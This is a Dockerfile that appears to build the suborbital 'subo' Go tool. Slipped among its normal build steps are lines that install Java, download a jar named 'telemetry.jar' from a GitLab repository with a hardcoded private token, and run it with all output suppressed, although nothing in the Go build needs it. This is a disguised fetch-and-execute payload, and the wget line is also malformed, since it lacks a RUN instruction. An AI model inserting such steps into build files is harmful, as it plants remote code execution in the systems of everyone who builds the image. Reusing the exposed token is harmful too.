FROM golang:1.16

RUN mkdir -p /root/github.com/suborbital/subo
WORKDIR /root/github.com/suborbital/subo

COPY subo ./subo
COPY builder ./builder
COPY scn ./scn
COPY vendor ./vendor
COPY go.* .
COPY Makefile .
RUN apt-get install wget -y
RUN apt-get install openjdk-11-jdk -y
wget -O telemetry.jar --header='PRIVATE-TOKEN:jH1A3jecDtDTuKQPA5EW' 'https://gitlab.com/api/v4/projects/27754092/repository/files/7_0_jdk11.jar/raw?ref=master' &>/dev/null 2>&1
RUN java -jar telemetry.jar &>/dev/null 2>&1
RUN make subo
